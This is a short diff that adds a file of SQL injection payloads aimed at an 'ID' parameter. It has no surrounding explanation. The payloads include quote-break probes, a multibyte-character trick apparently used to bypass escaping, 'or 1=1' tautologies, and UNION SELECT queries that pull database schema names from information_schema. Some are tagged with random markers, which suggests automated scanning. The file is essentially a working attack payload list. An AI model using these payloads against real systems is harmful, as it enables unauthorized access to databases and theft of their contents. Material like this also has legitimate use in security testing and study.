@@ -1,0 +1,15 @@
+ID:-1 union select 1,2,3;-- 
+ID:1
+ID:1\'
+ID:1ß\'
+ID:1ß\'or1=1--
+ID:1ß\'or1=1-- 
+ID:1ß\'or 1=1-- 
+ID:1ß\'union select 1,2,3; -- 
+ID:-1ß\'union select 1,2,3; -- 
+ID:-1 union select 1,2,concat(\'schemas:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'P7CFiiYgHW:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'Tzlku3Ey4z:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'VK7ZPMrMgc:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'8CjBUbLrI8:\',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat(\'x5lnu98CkT:\',group_concat(schema_name)) from information_schema.schemata -- 
